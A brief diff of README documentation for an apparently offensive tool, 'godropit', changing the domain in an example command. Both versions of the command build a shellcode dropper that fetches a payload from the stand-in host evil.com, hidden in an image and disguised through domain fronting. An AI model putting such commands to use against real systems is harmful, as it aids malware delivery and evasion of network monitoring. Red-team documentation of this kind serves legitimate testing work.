@@ -102,7 +102,7 @@ godropit new local -i shellcode.bin -n mylocaldropper -o /path/to/outdir -l -s -
 ```
 You can also specify the host header for domain fronting:
 ```
-godropit new local -i shellcode.bin -n mylocaldropper -o /path/to/outdir -l -s -u http://evil.com/test.png --img /path/to/imagefile.jpg/png --host something.alphaweasel.com
+godropit new local -i shellcode.bin -n mylocaldropper -o /path/to/outdir -l -s -u http://evil.com/test.png --img /path/to/imagefile.jpg/png --host something.wibble.com
 ```
 
 **Notes about stego droppers:**
